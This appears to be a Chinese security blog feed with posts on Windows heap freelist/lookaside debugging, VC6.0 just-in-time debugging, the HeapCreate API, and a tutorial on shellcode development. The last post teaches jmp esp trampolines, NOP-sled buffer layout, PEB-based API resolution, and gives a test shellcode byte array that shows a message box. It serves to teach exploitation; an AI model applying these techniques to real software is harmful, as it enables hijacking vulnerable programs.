<p>当释放h4的时候会发生堆块的合并现象（两个连续的空闲块就会发生合并）。首先是先从空表中将三个空闲块摘下，重新计算合并后的堆块的大小，然后合并成新的空闲块，链入空表。如下图所示分别为空表索引区状态和合并后堆块状态：<br><img src="/images/2017-06-24/freelist_test7.jpg" alt="堆块状态"><br><img src="/images/2017-06-24/freelist_test8.jpg" alt="堆块状态"></p>
<p>如上图所所示：</p>
<ul>
<li>在0x188处的freelist[2]，原来标识的空表中有两个空闲块h1和h3，而现在只有一个h1，因为h3在合并时被摘下了。同理0x198处的freelist[4]也被摘下了。</li>
<li>在0x1B8处的freelist[8]，原来指向自身，现在指向合并后的新空闲块0x3606A8，处的值 0x0008 即是：合并后的堆块的大小。后八个字节的指针对，则指向空表的索引区。</li>
</ul>
<p><b>注意事项</b></p>
<p>以上是空表中的堆块的合并，并且只发生在空表中。</p>
<p>整个过程比较费时，繁琐，在强调效率的情况下，堆块合并就会被禁止，设置为占用太。</p>
<p>空表中第一个块的情况下不会向前发生合并，最后一个块不会向后进行合并。</p>
<h4 id="3-3-快表结构验证调试"><a href="#3-3-快表结构验证调试" class="headerlink" title="3.3 快表结构验证调试"></a>3.3 快表结构验证调试</h4><h5 id="3-3-1-验证代码"><a href="#3-3-1-验证代码" class="headerlink" title="3.3.1 验证代码"></a>3.3.1 验证代码</h5><pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

void main()
{
    HLOCAL h1,h2,h3,h4;
    HANDLE hp;
    hp = HeapCreate(0, 0, 0);
    __asm int 3

    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);

    HeapFree(hp, 0, h1);
    HeapFree(hp, 0, h2);
    HeapFree(hp, 0, h3);
    HeapFree(hp, 0, h4);

    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    HeapFree(hp, 0, h2);
}
</code></pre><h5 id="3-3-2-实验过程"><a href="#3-3-2-实验过程" class="headerlink" title="3.3.2 实验过程"></a>3.3.2 实验过程</h5><p><img src="/images/2017-06-24/freelist_test9.jpg" alt="空表地址"><br><img src="/images/2017-06-24/lookaside_test.jpg" alt="快表地址"><br>首先在dump窗口中直接跳转至0x360178处，此处是快表地址，发现地址指向0x00361E90，不是原来的0x00360688。此时基本上可以看出有快表！<br>直接在dump窗口中进行跳转到0x360688处，此时发现快表为空。这也是为什么要反复申请释放内存的原因。<br>首先从FreeList[0]中依次申请8，8，16，24字节的内存，然后进行释放到快表中（快表未满时释放到快表中）。根据三个堆块的大小我们可以知道8字节的会被释放到Lookaside[1]中、16字节的会被释放到Lookaside[2]中、24字节的会被释放到Lookaside[3]中。</p>
<p>先运行程序到地址 0x40109F处。此时直接观察快表中的变化，此时发现仍然为空，下面运行释放程序，直接单步执行命令运行到地址：0x401106处，这是观察快表的变化如图所示：<br><img src="/images/2017-06-24/lookaside_test2.jpg" alt="快表测试1"></p>
<p>运行程序到地址 0x40110D处观察堆块是否链如快表：<br><img src="/images/2017-06-24/lookaside_test3.jpg" alt="运行状态"></p>
<p>如上图所示h1 - h4已经链接进入块表中并且都是处于占用态。 地址 0x361e90指向下一个堆块（因为h1 h2 同时为八字节的空闲堆块）</p>
<p>当程序运行到地址 0x40111D时（也就是执行完申请内存的代码时）<br>h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);<br>此时申请的堆块应该从块表中申请，此时查看堆表区的索引：<br><img src="/images/2017-06-24/lookaside_test4.jpg" alt="重新申请时的快表"><br><img src="/images/2017-06-24/lookaside_test5.jpg" alt="重新申请时的空表"><br>从以上两图中可以看到当继续申请内存的时候，是从快表lookside[2]处卸下的堆块。</p>
<p>当释放的时候，代码执行到0x401140,还是将空闲堆块释放到此处执行代码：<br>HeapFree(hp,0,h2);<br>执行完后继续查看上图中地址的值：<br><img src="/images/2017-06-24/lookaside_test6.jpg" alt="释放内存值快表"><br>如图所示：当释放完堆块后还是链接进入啦快表 looksize[2]</p>
<h4 id="3-4-快表中堆块与空表中堆块区别"><a href="#3-4-快表中堆块与空表中堆块区别" class="headerlink" title="3.4 快表中堆块与空表中堆块区别"></a>3.4 快表中堆块与空表中堆块区别</h4><ul>
<li>块首中的标志位为0x01，也就是这个堆块是Busy状态，这也是为什么快表中的堆块不进行合并操作的原因。</li>
<li>块首只存指向下一堆块的指针，不存在指向前一堆块的指针。</li>
</ul>
<p><br></p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.jianshu.com/p/83a47f833ca5" target="_blank" rel="external">堆溢出研究二</a><br><a href="http://blog.csdn.net/qq_21210995/article/details/60883572" target="_blank" rel="external">堆溢出（一）堆结构</a><br><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-heap" target="_blank" rel="external">!Heap</a><br><a href="http://www.informit.com/articles/article.aspx?p=1081496" target="_blank" rel="external">Advanced Windows Debugging: Memory Corruption Part II—Heaps</a><br><a href="http://xcon.xfocus.org/XCon2004/archives/14_Reliable%20Windows%20Heap%20Exploits_BY_SHOK.pdf" target="_blank" rel="external">Reliable Windows Heap Exploits BY SHOK</a></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VC6.0进行软件断点调试]]></title>
      <url>/2017/06/24/VC6-0%E8%BF%9B%E8%A1%8C%E8%BD%AF%E4%BB%B6%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><font color="#f00">VC6.0进行断点调试的时候，系统经常会提示应用程序错误，然后调试过程直接结束。所以我们急需解决vc6.0软件断点调试的解决办法。<br><br>VC中的Just-in-time调试,使用该调试模式应用程序可以在Visual C++开发环境之外运行知道发生一个错误.当遇到一个程序错误时,Just-in-time调试自动加载Visual C++ Debugger。<br><br>打开Just-in-time调试：修改Tools-&gt;Options-&gt;Debugging，选中Just-in-time debugging选项即可。(其实该选项所做的操作就是写了个注册表,将自己作为其他程序抛出异常时的处理程序,下面有介绍)<br></font>

<p>设置即时调试断点，在编译生成的Debug版本程序中加入断点异常，在代码中硬编码一个断点(相当于让程序出错)，让程序在到达程序员希望停止位置时加载已经打开源码的Debugger实现对该位置的调试。(当然没有源码也可以调试的，如果想调试汇编的话.)</p>
<ul>
<li><p>VC中的即时调试断点设置方法:DbgBreakPoint 或者 DebugBreak</p>
</li>
<li><p>C#中的即时调试断点设置方法:Debugger.Break</p>
</li>
<li><p>js中的即时调试断点设置方法:Debugger</p>
</li>
<li><p>ASP(VBS)中的即时调试断点设置方法:Stop</p>
</li>
</ul>
<p>###VC6.0调试 断点中断程序的执行(断点指令)</p>
<h4 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h4><p>那么我们就来说说什么是断点，断点是什么？不是F9 ，也不是那个小红球，在Intel系列的CPU（包括AMD生产的CPU）里面，它其实是一个特殊的指令：INT 3。CPU在执行程序的指令集的时候，只要碰到这个指令，就会中断程序的执行。</p>
<h5 id="引用的示例"><a href="#引用的示例" class="headerlink" title="引用的示例"></a>引用的示例</h5><p>当然我们需要用事实来证明我上面的话，因此把下面的程序编译并且执行一下，点“Yes”，点“Break”，程序就中断了.<br>以下为引用内容：</p>
<pre><code>#include &lt;stdio.h&gt;
void main()
{
   printf(&quot;Before breakpoint&quot;n&quot;);
   __asm
   {
     int 3
   }
   printf(&quot;Before breakpoint&quot;n&quot;);
}
</code></pre><p>断点是int 3这个指令触发的。</p>
<p>由int 3这个指令（当然是在intel系列的CPU上面）引申出来的函数 ：</p>
<table>
<thead>
<tr>
<th>语言/工具</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>C++</td>
<td>DebugBreak</td>
<td>在C++代码中硬编码一个断点。</td>
</tr>
<tr>
<td>C#</td>
<td>Debugger.Break</td>
<td>在.NET代码中硬编码一个断点</td>
</tr>
<tr>
<td>Visual Studio</td>
<td>断点</td>
<td>设置一个断点</td>
</tr>
</tbody>
</table>
<h3 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h3><p>随时将调试程序连接到任何进程的能力称为即时调试（Just-in-timeDebugging）。</p>
<p>这里我们对它如何工作稍加说明：当程序员点击Cancel按钮，就是告诉UnhandledExceptionFilter函数对进程进行调试。在内部，UnhandledExceptionFilter调用调试程序，这需要查看下面的注册表子关键字：</p>
<p><font color="#0f0">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/AeDebug<br>在这个子关键字里，有一个名为Debugger的数值，在安装VisualStudio时被设置成下面的值：<br>&quot;C:/Program Files/Microsoft Visual Studio/Common/MSDev98/Bin/msdev.exe&quot; -p %ld -e %ld<br></font><br>在Windows98中，这些值不是存放在注册表中，而是存放在Win.ini文件中。<br>这一行代码是告诉系统要将哪一个程序（这里是MSDev.exe）作为调试程序运行。当然也可以选择其他调试程序。 UnhandledExceptionFilter还在这个命令行中向调试程序传递两个参数。第一个参数是被调试进程的ID。第二个参数规定一个可继承的 手工复位事件，这个事件是由UnhandledExceptionFilter按无信号状态建立的。厂商必须实现他们的调试程序，这样才能认识指定进程 ID和事件句柄的-p和-e选项。<br>在进程ID和事件句柄都合并到这个串中之后，UnhandledExceptionFilter通过调用 CreateProcess来执行调试程序。这时，调试程序进程开始运行并检查它的命令行参数。如果存在-p选项，调试程序取得进程ID，并通过调用 DebugActiveProcess将自身挂接在该进程上。<br>BOOL DebugActiveProcess(DWORD dwProcessID);<br>一旦调试程序完成自身的挂接，操作系统将被调试者（debuggee）的状态通报给调试程序。<br>在调试程序完全初始化之后，它要再检查它的命令行，找-e选项。如果该选项存在，调试程序取得相应的事件句柄并调用SetEvent。调试程序可以直接使用事件的句柄值，因为事件句柄具有创建的可继承性，并且被调试进程对UnhandledExceptionFilter函数的调用也使调试程序进程成为一个子进程。</p>
<p>设定这个事件将唤醒被调试进程的线程。被唤醒的线程将有关未处理异常的信息传递给调试程序。调试程序接收这些通知并加载相应的源代码文件，再将自身放在引发异常的指令位置上。<br>还有，不必在调试进程之前等待异常的出现。可以随时将一个调试程序连接在任何进程上，只需运行“MSDEV-pPID”，其中PID是要调试的进程的ID。 实际上，利用Windows2000 TaskManager，做这些事很容易。当观察Process标记栏时，可以选择一个进程，点击鼠标右键，并选择Debug菜单选项。这将引起 TaskManager去查看前面讨论过的注册表子关键字，调用CreateProcess，并传递所选定的进程的ID作为参数。在这里，TaskManager为事件句柄传送0值。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>本文转自<a href="http://blog.csdn.net/dongzhiquan/article/details/4568389" target="_blank" rel="external">即时调试（Just-in-timeDebugging） Visual Studio调试 断点中断程序的执行(断点指令)</a></p>
]]></content>
      
        <categories>
            
            <category> 编程技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> 调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HeapCreate()]]></title>
      <url>/2017/06/23/HeapCreate/</url>
      <content type="html"><![CDATA[<p>HeapCreate<br>这个函数创建一个只有调用进程才能访问的私有堆。进程从虚拟地址空间里保留出一个连续的块并且为这个块特定的初始部分分配物理空间。</p>
<p>HANDLE HeapCreate(DWORD flOptions , DWORD dwInitialSize , DWORD dwMaxmumSize);</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>flOptions：堆的可选属性。这些标记影响以后对这个堆的函数操作，函数有：HeapAlloc , HeapFree , HeapReAlloc , HeapSize .<br>下面给_出在此可以指定的标记：<br>HEAP_NO_SERIALIAZE：指定当函数从堆里分配和释放空间时不互斥（不使用互斥锁）。当不指定该标记时默认为使用互斥。序列化允许多个线程操作同一个堆而不会错误。这个标记是可忽略的。<br>HEAP_SHARED_READONLY：这个标记指定这个堆只能由创建它的进程进行写操作，对其他进程是只读的。如果调用者不是可靠的，调用将会失败，错误代码ERROR_ACCESS_DENIDE 。<br>注解：为了使用标记为HEAP_SHARED_READONLY的堆，运行在kernel mode（核心状态）是必须的。</p>
<p>dwInitialSize：堆的初始大小，单位为Bytes。这个值决定了分配给堆的初始物理空间大小。这个值将向上舍入知道下个page boundary（页界）。若需得到主机的页大小，使用GetSystemInfo 函数。</p>
<p>dwMaxmumSize：如果该参数是一个非零的值，它指定了这个堆的最大大小，单位为Bytes。该函数会向上舍入该值直到下个页界，然后为这个堆在进程的虚拟地址里保留舍入后大小的块。如果函数 HeapAlloc 和 HeapReAlloc 要求分配的空间超过参数 dwInitialSize 指定的大小，系统会分配额外的空间给该堆直到这个堆的最大大小。If dwMaximumSize is nonzero, the heap cannot grow and an absolute limitation arises where all allocations are fulfilled within the specified heap unless there is not enough free space. （如果该参数非零，除非没有足够的空间，这个堆总可以增长到该大小）。如果该参数为零，那么该堆大小的唯一限制是可用的内存空间。分配大小超过 0x0018000 Bytes的空间总会失败，因为获得这么大的空间需要系统调用 VirtualAlloc 函数。需要使用大空间的应用应该把该参数设置为零。</p>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>成功：一个指向新创建的堆的指针。<br>失败：NULL<br>调用函数 GetLastError 获得更多的错误信息。</p>
<h4>附注</h4>

<p>这个函数在调用进程里创建一个私有堆，进程可调用 HeapAlloc 函数分配内存空间。这些页在进程的虚拟空间内创建了一个块，在那里堆可以增长。<br>如果 HeapAlloc 函数请求的空间超过了现有的页大小，如果物理空间足够的话，额外的空间将会从已保留的空间里附加。<br>只有创建私有堆的进程可以访问私有堆。<br>如果一个DLL（动态链接库）创建了一个私有堆，那么这么私有堆是在调用该DLL的进程的地址空间内，且仅该进程可访问。<br>系统会使用私有堆的一部分空间去储存堆的结构信息，所以，不是所有的堆内空间对进程来说是可用的。例如：HeapAlloc函数从一个最大大小为 64KB 的堆里申请 64KB 的空间，由于系统占用的一部分空间，这个请求通常会失败。</p>
<h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Minimum supported client</td>
<td>Windows XP [desktop apps or Windows Store apps]</td>
</tr>
<tr>
<td>Minimum supported server</td>
<td>Windows Server 2003 [desktop apps or Windows Store apps]</td>
</tr>
<tr>
<td>Minimum supported phone</td>
<td>Windows Phone 8</td>
</tr>
<tr>
<td>Header</td>
<td>HeapApi.h (include Windows.h);<br>WinBase.h on Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003 and Windows XP (include Windows.h)</td>
</tr>
<tr>
<td>Library</td>
<td>Kernel32.lib</td>
</tr>
<tr>
<td>DLL</td>
<td>Kernel32.dll</td>
</tr>
</tbody>
</table>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597.aspx" target="_blank" rel="external">HeapCreate in MSDN</a><br><a href="http://blog.csdn.net/windroid/article/details/42302519" target="_blank" rel="external">HeapCreate()</a></p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[开发shellcode]]></title>
      <url>/2017/06/22/%E5%BC%80%E5%8F%91shellcode/</url>
      <content type="html"><![CDATA[<p>其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！</p>
<h3 id="1-shellcode概述"><a href="#1-shellcode概述" class="headerlink" title="1. shellcode概述"></a>1. shellcode概述</h3><h4 id="1-1-shellcode和exploit"><a href="#1-1-shellcode和exploit" class="headerlink" title="1.1 shellcode和exploit"></a>1.1 shellcode和exploit</h4><p>shellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。</p>
<p>exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入，exploit的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode，与shellcode具有一定的通用性不同，exploit往往只是针对特定漏洞而言的。</p>
<p>Metasploit通过规范化exploit和shellcode之间的接口把漏洞利用的过程封装成易用的模块，大大减少了exploit开发过程中的重复工作，深刻体现了代码重用和模块化、结构化的思想:<br>（1）所有的 exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令地址等关键信息。<br>（2）将常用的shellcode（例如，用于绑定端口反向链接、执行任意命令等）封装成一个个通用的模块，可以轻易地域任意漏洞的exploit进行结合。</p>
<h4 id="1-2-shellcode需要解决的问题"><a href="#1-2-shellcode需要解决的问题" class="headerlink" title="1.2 shellcode需要解决的问题"></a>1.2 shellcode需要解决的问题</h4><p><b>由于运行在某个动态链接苦衷的函数在程序运行的过程中被动态加载，这时的栈会动态变化，也即调试器中抄出来的shellcode起始地址下次改变了。所以要编写出通用的shellcode，就需要找到一种途径让程序能够自动定位到shellcode的起始地址。</b></p>
<h3 id="2-定位shellcode"><a href="#2-定位shellcode" class="headerlink" title="2. 定位shellcode"></a>2. 定位shellcode</h3><h4 id="2-1-栈帧移位与jmp-esp"><a href="#2-1-栈帧移位与jmp-esp" class="headerlink" title="2.1 栈帧移位与jmp esp"></a>2.1 栈帧移位与jmp esp</h4><p>动态定位的方法：<br>（1）用内存中任意一个jmp esp指令的地址覆盖函数返回地址，而不是原来手工查出的shellcode起始地址直接覆盖。<br>（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。<br>（3）由于esp在函数返回时仍指向栈区（函数返回地址之后），jmp esp指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。<br>（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode恰好放在函数返回地址之后，这样jmp esp指令执行过后恰好跳进shellcode。</p>
<p><img src="/images/2017-06-22/shellcode.png" alt="使用“跳板”的溢出利用流程"></p>
<h4 id="2-2-获取跳板地址"><a href="#2-2-获取跳板地址" class="headerlink" title="2.2 获取跳板地址"></a>2.2 获取跳板地址</h4><font color="#f00">最简单，最实用的是使用msfpescan获取jmp esp的地址，而且速度更快！！！</font>

<p>具体指令是: msfpescan -f -j esp PE文件</p>
<p>书中给出了另一种方法：</p>
<p>获取user32.dll内跳转指令地址最直观的方法就是编程搜索内存。其他程序也是如此！</p>
<p>另一种办法就是使用OllyDbg中的搜索命令指令，对程序命令进行搜索，最终可以找到！搜 JMP ESP 或者 CALL ESP</p>
<p>获取JMP ESP的代码</p>
<pre><code>
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define DLL_NAME "user32.dll"

void main()
{
    BYTE *ptr;
    int position, address;
    HINSTANCE handle;
    BOOL done_flag = FALSE;
    handle = LoadLibrary(DLL_NAME);
    if (!handle)
    {
        printf("  load dll erro !");
        exit(0);
    }

    ptr = (BYTE*)handle;

    for (position=0; !done_flag; position++)
    {
        try
        {
            //0xFFE4 is opcode of jmp esp
            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)
            {
                int address = (int)ptr + position;
                printf("OPCODE(JMP ESP) found at 0x%x\n", address);
                done_flag = TRUE;
            }
        }
        catch(...)
        {
            int address = (int)ptr + position;
            printf("END OF 0x%x\n", address);
            //done_flag = TRUE;
        }
    }
}

</code></pre>

<p>上面的方法很具有局限性，因为将jmp esp重新更换为jmp eax时，上述代码就不可用，需要查询相应的opcode</p>
<h4 id="2-3-测试shellcode的可执行性"><a href="#2-3-测试shellcode的可执行性" class="headerlink" title="2.3 测试shellcode的可执行性"></a>2.3 测试shellcode的可执行性</h4><p>我们可以在vc6.0中编译相应的汇编代码，最好能够正常执行，能够执行了之后，通过OllyDbg获得相应的代码块，导出即可获得完整的代码。</p>
<pre><code>
#include &lt;windows.h&gt;

void main()
{
    HINSTANCE LibHandle;
    char dllbuf[11] = "user32.dll";
    LibHandle = LoadLibrary(dllbuf);
    _asm{
        sub sp,0x440
        xor ebx,ebx
        push ebx //cut string
        push 0x74736577
        push 0x6C696166 //push failwest

        mov eax,esp //load address of failwest
        push ebx
        push eax
        push eax
        push ebx

        mov eax, 0x77E16544    //address should be reset in different OS, this is Win 2000 server
        call eax //call MessageboxA
        push ebx
        mov eax, 0x77E70E7D    //address of ExitProcess in Kernel32.dll
        call eax //call exit(0)
    }
}
</code></pre>

<p>如果使用上述地址能够弹出默认窗口，那么代表上述所用的MessageBoxA和ExitProcess的地址都是正确的。</p>
<h3 id="3-缓冲区的组织"><a href="#3-缓冲区的组织" class="headerlink" title="3. 缓冲区的组织"></a>3. 缓冲区的组织</h3><h4 id="3-1-缓冲区的组成"><a href="#3-1-缓冲区的组成" class="headerlink" title="3.1 缓冲区的组成"></a>3.1 缓冲区的组成</h4><p>如果选用jmp esp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小，所需shellcode长短等实际情况灵活布置缓冲区。送入缓冲区的数据分以下几种：</p>
<ol>
<li>填充物：可以是任意值，但是一般用nop指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。</li>
<li>淹没返回地址的数据：可以是跳转指令的地址、shellcode的地址，甚至是一个近似shellcode的地址。</li>
<li>shellcode：可执行的机器代码</li>
</ol>
<p>以下是几种缓冲区的组织方式：<br><img src="/images/2017-06-22/shellcode_method.png" alt="不同缓冲区组织方式"><br>当缓冲区较大时，倾向于将shellcode布置到缓冲区中。有以下几个好处：</p>
<ol>
<li>合理利用缓冲区，使攻击串的总长度减小；对于远程攻击，有时所有数据必须包含在一个数据包中！</li>
<li>对程序破坏小，比较稳定；溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。</li>
</ol>
<h4 id="3-2-抬高栈顶保护shellcode"><a href="#3-2-抬高栈顶保护shellcode" class="headerlink" title="3.2 抬高栈顶保护shellcode"></a>3.2 抬高栈顶保护shellcode</h4><p>把shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变ESP寄存器中的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push指令在栈中暂存数据，压栈数据很可能会破坏shellcode自身。</p>
<p>当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），这时shellcode离栈顶较远 ，几次压栈可能只会破坏到一些填充nop；但是，如果缓冲区已经被shellcode占满，则shellcode离栈顶比较近，这时的情况就必要危险。</p>
<p>为此，为了提高较强的通用性，通常会在shellcode中一开始就大范围抬高栈顶，把shellcode藏在栈内。</p>
<h4 id="3-3-使用其他跳转指令"><a href="#3-3-使用其他跳转指令" class="headerlink" title="3.3 使用其他跳转指令"></a>3.3 使用其他跳转指令</h4><p>使用jmp esp做“跳板”的方法是最简单，也是最常用的定位shellcode的方法。在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。往往除了ESP之外，EAX、EBX、ESI等寄存器也会指向栈顶附近，故在选择跳转指令地址时也可以灵活一些，除了jmp esp之外，mov eax、esp和jmp eax等指令序列也可以完成进入栈区的功能。</p>
<p><b><center>常用跳转指令与机器码的对应关系</center></b></p>
<table>
<thead>
<tr>
<th>机器码（十六进制）</th>
<th>对应的跳转指令</th>
<th>机器码（十六进制）</th>
<th>对应的跳转指令</th>
</tr>
</thead>
<tbody>
<tr>
<td>FF EO</td>
<td>JMP EAX</td>
<td>FF D0</td>
<td>CALL EAX</td>
</tr>
<tr>
<td>FF E1</td>
<td>JMP ECX</td>
<td>FF D1</td>
<td>CALL ECX</td>
</tr>
<tr>
<td>FF E2</td>
<td>JMP EDX</td>
<td>FF D2</td>
<td>CALL EDX</td>
</tr>
<tr>
<td>FF E3</td>
<td>JMP EBX</td>
<td>FF D3</td>
<td>CALL EBX</td>
</tr>
<tr>
<td>FF E4</td>
<td>JMP ESP</td>
<td>FF D4</td>
<td>CALL ESP</td>
</tr>
<tr>
<td>FF E5</td>
<td>JMP EBP</td>
<td>FF D5</td>
<td>CALL EBP</td>
</tr>
<tr>
<td>FF E6</td>
<td>JMP ESI</td>
<td>FF D6</td>
<td>CALL ESI</td>
</tr>
<tr>
<td>FF E7</td>
<td>JMP EDI</td>
<td>FF D7</td>
<td>CALL EDI</td>
</tr>
</tbody>
</table>
<h4 id="3-4-不使用跳转指令"><a href="#3-4-不使用跳转指令" class="headerlink" title="3.4 不使用跳转指令"></a>3.4 不使用跳转指令</h4><p>个别苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中，如果过能够淹没大片的内存区域，可以将shellcode布置在一大段nop之后。这时定位shellcode时，只要能跳进这一大片nop中，shellcode就可以得到执行。</p>
<h4 id="3-5-函数返回地址移位"><a href="#3-5-函数返回地址移位" class="headerlink" title="3.5 函数返回地址移位"></a>3.5 函数返回地址移位</h4><p>一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍过的方法来提高exploit的成功率。</p>
<p>如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就能得以执行。</p>
<p><img src="/images/2017-06-22/shellcode2.png" alt="shellcode"></p>
<font color="#f00">函数返回地址距离我们输入的字符串的偏移在不同的计算机上就可能出现按照字节错位</font>

<p><img src="/images/2017-06-22/shellcode_shift.png" alt="shellcode移位"></p>
<h3 id="4-开发通用的shellcode"><a href="#4-开发通用的shellcode" class="headerlink" title="4. 开发通用的shellcode"></a>4. 开发通用的shellcode</h3><h4 id="4-1-定位API的原理"><a href="#4-1-定位API的原理" class="headerlink" title="4.1 定位API的原理"></a>4.1 定位API的原理</h4><p>所有win32程序都会加载ntdll.dll和kernel32.dll这两个最基础的动态链接库。如果想要在win32平台上定位kernel32.dll中的API地址，可采用如下方法：<br>（1）首先通过段选择字FS在内存中找到当前的线程环境块TEB<br>（2）线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针<br>（3）进程环境块中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针。其中，存放着已经被进程装载的动态链接库的信息。<br>（4）PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList<br>（5）模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点为kernel32.dll<br>（6）找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址<br>（7）从kernel32.dll的加载基址算起，偏移0x3C的地方就是PE头<br>（8）PE头偏移0x78的地方存放着指向函数导出表的指针<br>（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。</p>
<ul>
<li>导出表偏移0x1C处的指针指向存储导出函数偏移地址(RVA)的列表</li>
<li>导出表偏移0x20处的指针指向存储导出函数函数名的列表</li>
<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需函数是第几个，然后在地址列表汇总找到对应的RVA</li>
<li>获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。</li>
</ul>
<p><img src="/images/2017-06-22/shellcode_api.jpg" alt="在shellcode中动态定位API的原理"></p>
<font color="#f00">需要说明的是：上述图中所表现的ntdll.dll过了之后就是kernel32.dll并不完全正确，准确的说这只在window xp及其以前是这样的；但是从win7开始，这两者之间加入了kernelbase.dll</font>

<h4 id="4-2-shellcode的加载与测试"><a href="#4-2-shellcode的加载与测试" class="headerlink" title="4.2 shellcode的加载与测试"></a>4.2 shellcode的加载与测试</h4><p>这一章类似于2.3节的内容，但是有些许的改变，可以与其对照进行查看.</p>
<pre><code>
#include &lt;windows.h&gt;

char shellcode[] =
"\x66\x81\xEC\x40\x04"        // SUB SP, 440
"\x33\xDB"                    // XOR EBX, EBX
"\x53"                        // PUSH EBX
"\x68\x77\x65\x73\x74"        // PUSH 74736577
"\x68\x66\x61\x69\x6C"        // PUSH 6C696166
"\x8B\xC4"                    // MOV EAX, ESP
"\x53"                        // PUSH EBX
"\x50"                        // PUSH EAX
"\x50"                        // PUSH EAX
"\x53"                        // PUSH EBX
"\xB8\x44\x65\xE1\x77"        // MOV EAX, user32.MessageBoxA
"\xFF\xD0"                    // CALL EAX
"\x53"                        // PUSH EBX
"\xB8\x7D\x0E\xE7\x77"        // MOV EAX, kernel32.ExitProcess
"\xFF\xD0";                    // CALL EAX

void main()
{
    HINSTANCE LibHandle;
    char dllbuf[11] = "user32.dll";
    LibHandle = LoadLibrary(dllbuf);
    __asm
    {
        lea eax, shellcode
        push eax
        ret
    }
}
</code></pre>

<h4 id="4-3-动态定位API地址的shellcode"><a href="#4-3-动态定位API地址的shellcode" class="headerlink" title="4.3 动态定位API地址的shellcode"></a>4.3 动态定位API地址的shellcode</h4><p>首先需要知道的是：<br>MessageBoxA： user32.dll<br>ExitProcess: kernel32.dll<br>LoadLibraryA: kernel32.dll</p>
